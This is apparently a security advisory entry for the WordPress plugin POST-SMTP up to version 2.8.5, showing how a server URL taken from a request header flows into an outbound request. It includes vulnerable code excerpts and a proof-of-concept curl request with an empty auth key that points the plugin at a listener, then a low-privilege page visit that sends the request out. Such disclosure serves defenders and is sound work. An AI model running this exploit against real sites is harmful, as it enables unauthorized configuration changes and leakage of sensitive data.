### POST-SMTP

- **Application**: POST-SMTP<= 2.8.5

- **Threat Impact**: Sensitive data leakage

- **Code**: Server URL is get from request header, then updated. Then in `disconnect_app`, the server URL is used in sink function `wp_remote_post` as URL host.

  ```
  public function connect_app( WP_REST_Request $request ) {
    ...
    $this->server_url = $request->get_header( 'server_url' );
    ...
  }
  
  ```
  
  ```
  public function disconnect_app() {
    ...
    $response = wp_remote_post(
  					"{$this->server_url}/disconnect-app",
    ...
  				);
  }
  ```
  
- **POC**:

  1. Listen on 8888 on server side

  2. Send the following curl request to set the server

     ```
     curl --location --request POST 'http://test-server/wp-json/post-smtp/v1/connect-app' \
     --header 'auth-key;' \
     --header 'server-url: http://127.0.0.1:8888' \
     --header 'fcm-token: bbbb'
     ```

  3. Login (subscriber is also ok), visit `http://test-server/wp-admin/admin.php?action=post_smtp_disconnect_app&auth_token=bbbb`

  4. Receive a request on server side. 
